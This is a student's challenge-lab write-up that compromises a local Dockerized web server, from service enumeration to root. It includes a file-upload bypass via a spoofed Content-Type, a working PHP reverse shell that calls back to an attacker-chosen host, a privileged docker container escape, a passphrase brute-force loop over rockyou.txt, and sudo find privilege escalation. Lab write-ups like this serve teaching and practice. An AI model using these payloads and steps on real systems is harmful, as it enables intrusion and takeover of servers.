# Challange lab CSOa

**Author:** Michal Ľaš (xlasmi00)  
**Date:** 14.04.2025


## Enumeration (information gathering)

1. `namp -sV -p 2222,8000,8443 localhost` for gathering running services and their versions
	+ 2222/tcp open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
	+ 8000/tcp open  http     nginx 1.25.4
	+ 8443/tcp open  ssl/http nginx 1.25.4

2. ssh to port 2222 - `ssh -p 2222 localhost` faild with Permission denied (publickey)

3. _gobuster_ for finding directories, domains and common web stuff
	+ `gobuster dir -u http://localhost:8000 -w directory-list-2.3-big.txt -t 50`
	+ `gobuster vhost -u http://localhost:8000 -w subdomains-top1million-5000.txt`
	+ Nothing was found

4. _nikto_ web application scanning
	+ found allowed HTTP methods: HEAD, GET, POST, OPTIONS

5. Considering multiple sites on an Nginx web server
	+ checking SSL Certificate `nmap -p 8443 --script ssl-cert localhost`
	+ found that it is for hostname **montypythonquot.es**
	+ trying to access web site with hostname **montypythonquot.es**: `curl -H "Host: montypythonquot.es" http://localhost:8000`
	+ **found hidden site montypythonquot.es**

6. Discovering **montypythonquot.es**
	+ `/new` page with possibility of file upload
	+ `/quote/{1,2,3,4}` pages with quotes
	+ `/systeminfo` lot of information about the application architecture:
		- Dockerized stack: Web frontend _Nginx_, Backend _PHP/7.2.34_, DB _MySQL_
		- Application runs in `/var/python_www` on host
	+ `gobuster dir -u http://montypythonquot.es:8000 -w gobuster/directory-list-2.3-big.txt` found `/img`


## Service exploitation

I see two possible attacks at this point. The first is SQL injection, 
since the `/quote/<id>` page probably accesses the database. The second attack 
could be local file inclusion, for example of an image, since the `/new` page 
can upload images that are then available in `/img/<image_name>`.

### Local file inclusion leading to reverse shell

First I tried to upload a `.php` file which I renamed to `.jpg`. 
The code did upload, but I couldn't get it to run in any way. As a second approach, 
I chose to upload the `.php` code, send a request, which failed at first, 
then I modified the **Content Type** header to `image/png`and managed to run this file.

I then decided to create a reverse shell so that I could more easily explore the server. 
I uploaded the following code and ran `netcat` for listening on my side (I also tried a bash variant, 
but that didn't work for me):

```php
<?php
$ip = $_GET['rhost'];
echo "Target RHOST: $ip\n";
$port = 12345;
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', [
  0 => $sock,
  1 => $sock,
  2 => $sock
], $pipes);
?> 
```

This way I got a reverse shell.

### Container escape

I have discovered that I am in a container, so the next step will be to 
escape from that container (it would be weird if I could just get **root** privileges 
that easily).

There are more approaches to escape from the container, but it was possible to use 
_Docker_ in the container, so I tried to use a command that would give me access to 
the _root_ directory of the hosting device in the `/mnt` folder of the container:

`docker run -i --rm --privileged --userns=host -v /home:/mnt alpine sh`

That way I could access the folders on the server outside the container. This method 
has been described on [this](https://gtfobins.github.io/gtfobins/docker/) web page.
I verified this by looking it up in the `/etc/os-release` file that it showed me:
_Ubuntu 22.04.4 LTS (Jammy Jellyfish)_.


## Privilege escalation

I then decided to search in the folders I had mounted. I found the user **arthur**, 
who had **sudo** privileges assigned to the _find_ command (`find_holy_grail.sh`). However, 
I could not abuse this one yet because the script, had rights only for user **arthur**.

However, arthur also had a `.tar.gz` with a backup of his RSA private key. I could access 
this file, but the private key itself was protected with a passphrase.

`mkdir /tmp/extract`  
`tar -xvzf arthur_camelot_backup.tar.gz -C /tmp/extract`  
`cat /tmp/extract/.ssh/id_rsa`

To find the passphrase, I have created this script using `openssl` (inspiration from [this](https://www.youtube.com/watch?v=u4e6aPcpI7Q) tutorial). 

```bash
while IFS= read -r pass; do
  if openssl rsa -in arthur_key -out out.key -passin pass:"$pass" 2>/dev/null; then
    echo "Passphrase found: $pass"
    break
  fi
done < rockyou.txt # common password list

```

I found that the password was **holygrail** and I was able to log in using **ssh** via port 2222 as user **arthur**.

Then I abused the **find_holy_grail.sh** script with the **find** command, to which user arthur had 
sudo privileges. I modified the script in the following way, inspiration from [here](https://gtfobins.github.io/gtfobins/find/):

`sudo find / -exec /bin/bash \;`

and after running it, I got a shell with **root privileges**.
